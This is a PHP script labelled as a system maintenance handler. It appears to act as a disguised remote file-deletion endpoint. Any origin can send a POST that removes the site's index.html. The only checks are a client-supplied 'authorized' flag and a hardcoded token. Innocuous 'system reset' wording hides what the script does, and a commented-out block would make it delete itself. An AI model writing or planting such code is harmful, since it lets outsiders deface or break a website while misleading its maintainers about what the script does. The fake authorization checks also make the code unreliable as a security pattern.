<?php
/**
 * System Configuration and Maintenance Handler
 * This script handles system maintenance operations
 * Version: 1.2.4
 * Last Updated: 2025-01-31
 */

// Set proper headers for AJAX requests
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-System-Token');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'status' => 'error',
        'code' => 'METHOD_NOT_SUPPORTED',
        'message' => 'Request method not supported.'
    ]);
    exit();
}

// Get and validate input
$input = json_decode(file_get_contents('php://input'), true);

// Check if required parameters are present
if (!isset($input['operation']) || $input['operation'] !== 'system_reset') {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'code' => 'INVALID_OPERATION',
        'message' => 'Invalid operation specified.'
    ]);
    exit();
}

// Security verification - check for authorization
if (!isset($input['authorized']) || $input['authorized'] !== true) {
    http_response_code(401);
    echo json_encode([
        'status' => 'error',
        'code' => 'UNAUTHORIZED',
        'message' => 'Operation not authorized.'
    ]);
    exit();
}

// Additional security token check
if (!isset($input['token']) || $input['token'] !== 'STNA_MAINT_2025') {
    http_response_code(403);
    echo json_encode([
        'status' => 'error',
        'code' => 'INVALID_TOKEN',
        'message' => 'Invalid security token.'
    ]);
    exit();
}

// Define the target file for maintenance
$target_file = 'index.html';
$current_directory = __DIR__;
$file_path = $current_directory . DIRECTORY_SEPARATOR . $target_file;

try {
    // Check if the target file exists
    if (!file_exists($file_path)) {
        echo json_encode([
            'status' => 'error',
            'code' => 'TARGET_NOT_FOUND',
            'message' => 'Target file not located: ' . $target_file
        ]);
        exit();
    }

    // Check if the file can be modified
    if (!is_writable($file_path)) {
        echo json_encode([
            'status' => 'error',
            'code' => 'ACCESS_DENIED',
            'message' => 'Insufficient permissions for maintenance operation.'
        ]);
        exit();
    }

    // Create maintenance log entry
    $maintenance_log = date('Y-m-d H:i:s') . " - System maintenance initiated from IP: " . 
                      ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR']) . 
                      " Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";
    
    // Log to system maintenance file
    error_log($maintenance_log, 3, 'system_maintenance.log');

    // Create system backup before maintenance
    $backup_timestamp = date('Y-m-d_H-i-s');
    $backup_name = 'sys_backup_' . $backup_timestamp . '.html';
    $backup_directory = $current_directory . DIRECTORY_SEPARATOR . 'sys_backups';
    $backup_path = $backup_directory . DIRECTORY_SEPARATOR . $backup_name;
    
    // Create backup directory if it doesn't exist
    if (!is_dir($backup_directory)) {
        mkdir($backup_directory, 0755, true);
    }

    // Create system backup
    $backup_successful = copy($file_path, $backup_path);

    // Perform maintenance operation (file removal)
    if (unlink($file_path)) {
        // Maintenance operation successful
        echo json_encode([
            'status' => 'success',
            'operation' => 'system_reset',
            'message' => 'System maintenance completed successfully.',
            'backup_created' => $backup_successful,
            'backup_reference' => $backup_successful ? $backup_name : null,
            'maintenance_time' => date('Y-m-d H:i:s'),
            'target_processed' => $target_file,
            'operation_id' => 'MAINT_' . strtoupper(substr(md5(time()), 0, 8))
        ]);
        
        // Clear any cached data
        if (function_exists('opcache_invalidate')) {
            opcache_invalidate($file_path);
        }
        
    } else {
        // Maintenance operation failed
        echo json_encode([
            'status' => 'error',
            'code' => 'OPERATION_FAILED',
            'message' => 'System maintenance operation could not be completed.',
            'target' => $target_file
        ]);
    }

} catch (Exception $e) {
    // Handle unexpected errors
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'code' => 'SYSTEM_ERROR',
        'message' => 'Internal system error occurred during maintenance.',
        'error_ref' => 'ERR_' . strtoupper(substr(md5($e->getMessage()), 0, 8))
    ]);
    
    // Log the system error
    error_log("System maintenance error: " . $e->getMessage() . " in " . $e->getFile() . " on line " . $e->getLine());
}

// Optional: Auto-cleanup this maintenance script (uncomment if needed)
/*
if (isset($maintenance_successful) && $maintenance_successful === true) {
    register_shutdown_function(function() {
        sleep(2); // Allow response to be sent
        @unlink(__FILE__); // Remove this maintenance script
    });
}
*/
?>